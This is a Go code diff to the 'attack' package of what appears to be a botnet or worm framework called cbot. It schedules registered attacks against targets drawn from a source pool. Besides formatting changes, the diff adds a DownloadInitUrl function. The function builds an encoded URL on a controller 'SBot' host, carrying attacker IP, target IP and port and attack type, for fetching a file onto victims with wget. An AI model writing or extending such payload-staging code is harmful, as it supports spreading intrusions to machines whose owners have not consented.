@@ -1,37 +1,39 @@
 package attack
 
 import (
-	"github.com/cbot/targets"
+	"fmt"
+	"github.com/cbot/targets/local"
 	"github.com/cbot/targets/source"
+	"github.com/cbot/utils/netutils"
 	"sync"
 )
 
 type AttackTasks struct {
-
 	lock sync.Mutex
 
-	cfg *Config
+	Cfg *Config
 
 	spool *source.SourcePool
+
+	nodeInfo *local.NodeInfo
 
 	attacks map[string]Attack
 
 	syncChan chan int
 
 	attackProcessChan chan *AttackProcess
-
 }
 
-func NewAttackTasks(cfg *Config,spool *source.SourcePool) *AttackTasks {
-
+func NewAttackTasks(cfg *Config, nodeInfo *local.NodeInfo, spool *source.SourcePool) *AttackTasks {
 
 	return &AttackTasks{
-		lock:    sync.Mutex{},
-		cfg:     cfg,
-		spool:   spool,
-		attacks: make(map[string]Attack),
-		syncChan: make(chan int,cfg.MaxThreads),
-		attackProcessChan:  make(chan *AttackProcess,cfg.AttackProcessCapacity),
+		lock:              sync.Mutex{},
+		Cfg:               cfg,
+		spool:             spool,
+		nodeInfo:          nodeInfo,
+		attacks:           make(map[string]Attack),
+		syncChan:          make(chan int, cfg.MaxThreads),
+		attackProcessChan: make(chan *AttackProcess, cfg.AttackProcessCapacity),
 	}
 
 }
@@ -41,7 +43,7 @@ func (at *AttackTasks) AddAttack(attack Attack) {
 	at.lock.Lock()
 	defer at.lock.Unlock()
 
-	if _,ok := at.attacks[attack.Name()];!ok {
+	if _, ok := at.attacks[attack.Name()]; !ok {
 
 		//no existed
 
@@ -55,7 +57,7 @@ func (at *AttackTasks) RemoveAttack(name string) {
 	at.lock.Lock()
 	defer at.lock.Unlock()
 
-	delete(at.attacks,name)
+	delete(at.attacks, name)
 
 }
 
@@ -66,17 +68,16 @@ func (at *AttackTasks) SubAttackProcess() chan *AttackProcess {
 
 func (at *AttackTasks) PubAttackProcess(process *AttackProcess) {
 
-	at.attackProcessChan<- process
+	at.attackProcessChan <- process
 
 }
 
-
-func (at *AttackTasks) run(target targets.Target) {
+func (at *AttackTasks) run(target source.Target) {
 
 	at.lock.Lock()
 	defer at.lock.Unlock()
 
-	for _,attack := range at.attacks {
+	for _, attack := range at.attacks {
 
 		if attack.Accept(target) {
 
@@ -85,18 +86,17 @@ func (at *AttackTasks) run(target targets.Target) {
 	}
 }
 
+func (at *AttackTasks) PubSyn() {
 
-func (at *AttackTasks) PubSyn(){
-
-	at.syncChan<-1
+	at.syncChan <- 1
 
 }
 
 func (at *AttackTasks) Start() {
 
-	targetChan := at.spool.SubTarget("attack_tasks",at.cfg.SourceCapacity, func(target targets.Target) bool {
+	targetChan := at.spool.SubTarget("attack_tasks", at.Cfg.SourceCapacity, func(target source.Target) bool {
 
-		for _,attack := range at.attacks {
+		for _, attack := range at.attacks {
 
 			if attack.Accept(target) {
 
@@ -121,3 +121,17 @@ func (at *AttackTasks) Start() {
 	}
 }
 
+func (at *AttackTasks) DownloadInitUrl(targetIP string, targetPort int, attackType string, fname string) string {
+
+	upc := &netutils.URLPathCrypt{
+		Fname:        fname,
+		AttackType:   attackType,
+		AttackIP:     at.nodeInfo.IP,
+		TargetIP:     targetIP,
+		TargetPort:   targetPort,
+		DownloadTool: "wget",
+	}
+
+	return fmt.Sprintf("http://%s:%d/%s", at.Cfg.SBotHost, at.Cfg.SBotPort, netutils.URLPathCryptToString(upc))
+
+}
